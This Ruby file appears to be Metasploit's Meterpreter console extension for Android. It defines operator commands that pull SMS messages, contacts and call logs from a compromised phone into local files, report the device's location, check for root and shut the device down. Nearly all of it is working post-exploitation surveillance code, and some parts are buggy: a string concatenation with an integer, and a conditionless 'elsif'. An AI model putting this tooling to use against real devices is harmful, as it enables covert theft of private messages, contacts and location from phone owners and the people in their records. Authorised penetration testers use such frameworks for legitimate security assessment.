# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'msf/core/auxiliary/report'

module Rex
module Post
module Meterpreter
module Ui

###
# Android extension - set of commands to be executed on android devices.
# extension by Anwar Mohamed (@anwarelmakrahy)
###

class Console::CommandDispatcher::Android
  include Console::CommandDispatcher
  include Msf::Auxiliary::Report

  #
  # List of supported commands.
  #
  def commands
    all = {
      'dump_sms'          => 'Get sms messages',
      'dump_contacts'     => 'Get contacts list',
      'geolocate'         => 'Get current lat-long using geolocation',
      'dump_calllog'      => 'Get call log',
      'check_root'        => 'Check if device is rooted',
      'device_shutdown'   => 'Shutdown device'
    }

    reqs = {
      'dump_sms'        => [ 'dump_sms' ],
      'dump_contacts'   => [ 'dump_contacts' ],
      'geolocate'       => [ 'geolocate' ],
      'dump_calllog'    => [ 'dump_calllog' ],
      'check_root'      => [ 'check_root' ],
      'device_shutdown' => [ 'device_shutdown']
    }

    # Ensure any requirements of the command are met
    all.delete_if do |cmd, desc|
      reqs[cmd].any? { |req| not client.commands.include?(req) }
    end
  end

  def cmd_device_shutdown(*args)

    seconds = 0
    device_shutdown_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ],
      '-t' => [ false, 'Shutdown after n seconds']
    )

    device_shutdown_opts.parse(args) { | opt, idx, val |
      case opt
      when '-h'
        print_line('Usage: device_shutdown [options]')
        print_line('Shutdown device.')
        print_line(device_shutdown_opts.usage)
        return
      when '-t'
        seconds = val.to_i
      end
    }

    res = client.android.device_shutdown(seconds)

    if res
      print_status("Device will shutdown #{seconds > 0 ?('after ' + seconds + ' seconds'):'now'}")
    else
      print_error('Device shutdown failed')
    end
  end
  
  def cmd_dump_sms(*args)

    path = "sms_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
    dump_sms_opts = Rex::Parser::Arguments.new(
        '-h' => [ false, 'Help Banner' ],
        '-o' => [ false, 'Output path for sms list']
    )

    dump_sms_opts.parse(args) { | opt, idx, val |
      case opt
      when '-h'
        print_line('Usage: dump_sms [options]')
        print_line('Get sms messages.')
        print_line(dump_sms_opts.usage)
        return
      when '-o'
        path = val
      end
    }

    smsList = []
    smsList = client.android.dump_sms

    if smsList.count > 0
      print_status("Fetching #{smsList.count} sms #{smsList.count == 1? 'message': 'messages'}")
      begin
        info = client.sys.config.sysinfo

        data = ""
        data << "\n=====================\n"
        data << "[+] Sms messages dump\n"
        data << "=====================\n\n"

        time = Time.new
        data << "Date: #{time.inspect}\n"
        data << "OS: #{info['OS']}\n"
        data << "Remote IP: #{client.sock.peerhost}\n"
        data << "Remote Port: #{client.sock.peerport}\n\n"

        smsList.each_with_index { |a, index|

          data << "##{index.to_i + 1}\n"

          type = 'Unknown'
          if a['type'] == '1'
            type = 'Incoming'
          elsif a['type'] == '2'
            type = 'Outgoing'
          end

          status = 'Unknown'
          if a['status'] == '-1'
            status = 'NOT_RECEIVED'
          elsif a['status'] == '1'
            status = 'SME_UNABLE_TO_CONFIRM'
          elsif a['status'] == '0'
            status = 'SUCCESS'
          elsif a['status'] == '64'
            status = 'MASK_PERMANENT_ERROR'
          elsif a['status'] == '32'
            status = 'MASK_TEMPORARY_ERROR'
          elsif a['status'] == '2'
            status = 'SMS_REPLACED_BY_SC'
          end

          data << "Type\t: #{type}\n"

          time = a['date'].to_i / 1000
          time = Time.at(time)

          data << "Date\t: #{time.strftime('%Y-%m-%d %H:%M:%S')}\n"
          data << "Address\t: #{a['address']}\n"
          data << "Status\t: #{status}\n"
          data << "Message\t: #{a['body']}\n\n"
        }

        ::File.write(path, data)
        print_status("Sms #{smsList.count == 1? 'message': 'messages'} saved to: #{path}")

        return true
      rescue
        print_error("Error getting messages: #{$!}")
        return false
      end
    else
      print_status('No sms messages were found!')
      return false
    end
  end


  def cmd_dump_contacts(*args)

    path = "contacts_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
    dump_contacts_opts = Rex::Parser::Arguments.new(

      '-h' => [ false, 'Help Banner' ],
      '-o' => [ false, 'Output path for contacts list']

    )

    dump_contacts_opts.parse(args) { | opt, idx, val |
      case opt
      when '-h'
        print_line('Usage: dump_contacts [options]')
        print_line('Get contacts list.')
        print_line(dump_contacts_opts.usage)
        return
      when '-o'
        path = val
      end
    }

    contactList = []
    contactList = client.android.dump_contacts

    if contactList.count > 0
      print_status("Fetching #{contactList.count} #{contactList.count == 1? 'contact': 'contacts'} into list")
      begin
        info = client.sys.config.sysinfo

        data = ""
        data << "\n======================\n"
        data << "[+] Contacts list dump\n"
        data << "======================\n\n"

        time = Time.new
        data << "Date: #{time.inspect}\n"
        data << "OS: #{info['OS']}\n"
        data << "Remote IP: #{client.sock.peerhost}\n"
        data << "Remote Port: #{client.sock.peerport}\n\n"

        contactList.each_with_index { |c, index|

          data << "##{index.to_i + 1}\n"
          data << "Name\t: #{c['name']}\n"

          if c['number'].count > 0
            (c['number']).each { |n|
              data << "Number\t: #{n}\n"
            }
          end

          if c['email'].count > 0
            (c['email']).each { |n|
              data << "Email\t: #{n}\n"
            }
          end

          data << "\n"
        }
  
        ::File.write(path, data)
        print_status("Contacts list saved to: #{path}")

        return true
      rescue
        print_error("Error getting contacts list: #{$!}")
        return false
      end
    else
      print_status('No contacts were found!')
      return false
    end
  end

  def cmd_geolocate(*args)

    generate_map = false
    geolocate_opts = Rex::Parser::Arguments.new(

      '-h' => [ false, 'Help Banner' ],
      '-g' => [ false, 'Generate map using google-maps']

    )

    geolocate_opts.parse(args) { | opt, idx, val |
      case opt
      when '-h'
        print_line('Usage: geolocate [options]')
        print_line('Get current location using geolocation.')
        print_line(geolocate_opts.usage)
        return
      when '-g'
        generate_map = true
      end
    }

    geo = client.android.geolocate

    print_status('Current Location:')
    print_line("\tLatitude:  #{geo[0]['lat']}")
    print_line("\tLongitude: #{geo[0]['long']}\n")
    print_line("To get the address: https://maps.googleapis.com/maps/api/geocode/json?latlng=#{geo[0]['lat'].to_f},#{geo[0]['long'].to_f}&sensor=true\n")

    if generate_map
      link = "https://maps.google.com/maps?q=#{geo[0]['lat'].to_f},#{geo[0]['long'].to_f}"
      print_status("Generated map on google-maps:")
      print_status(link)
      Rex::Compat.open_browser(link)
    end

  end

  def cmd_dump_calllog(*args)

    path = "calllog_dump_#{Time.new.strftime('%Y%m%d%H%M%S')}.txt"
    dump_calllog_opts = Rex::Parser::Arguments.new(

      '-h' => [ false, 'Help Banner' ],
      '-o' => [ false, 'Output path for call log']

    )

    dump_calllog_opts.parse(args) { | opt, idx, val |
      case opt
      when '-h'
        print_line('Usage: dump_calllog [options]')
        print_line('Get call log.')
        print_line(dump_calllog_opts.usage)
        return
      when '-o'
        path = val
      end
    }

    log = client.android.dump_calllog

    if log.count > 0
      print_status("Fetching #{log.count} #{log.count == 1? 'entry': 'entries'}")
      begin
        info = client.sys.config.sysinfo

        data = ""
        data << "\n=================\n"
        data << "[+] Call log dump\n"
        data << "=================\n\n"

        time = Time.new
        data << "Date: #{time.inspect}\n"
        data << "OS: #{info['OS']}\n"
        data << "Remote IP: #{client.sock.peerhost}\n"
        data << "Remote Port: #{client.sock.peerport}\n\n"

        log.each_with_index { |a, index|

          data << "##{index.to_i + 1}\n"

          data << "Number\t: #{a['number']}\n"
          data << "Name\t: #{a['name']}\n"
          data << "Date\t: #{a['date']}\n"
          data << "Type\t: #{a['type']}\n"
          data << "Duration: #{a['duration']}\n\n"
        }

        ::File.write(path, data)
        print_status("Call log saved to #{path}")

        return true
      rescue
        print_error("Error getting call log: #{$!}")
        return false
      end
    else
      print_status('No call log entries were found!')
      return false
    end
  end


  def cmd_check_root(*args)

    check_root_opts = Rex::Parser::Arguments.new(
      '-h' => [ false, 'Help Banner' ]
    )

    check_root_opts.parse(args) { | opt, idx, val |
      case opt
      when '-h'
        print_line('Usage: check_root [options]')
        print_line('Check if device is rooted.')
        print_line(check_root_opts.usage)
        return
      end
    }

    is_rooted = client.android.check_root

    if is_rooted
      print_good('Device is rooted')
    elsif
      print_status('Device is not rooted')
    end
  end

  #
  # Name for this dispatcher
  #
  def name
    'Android'
  end

end

end
end
end
end
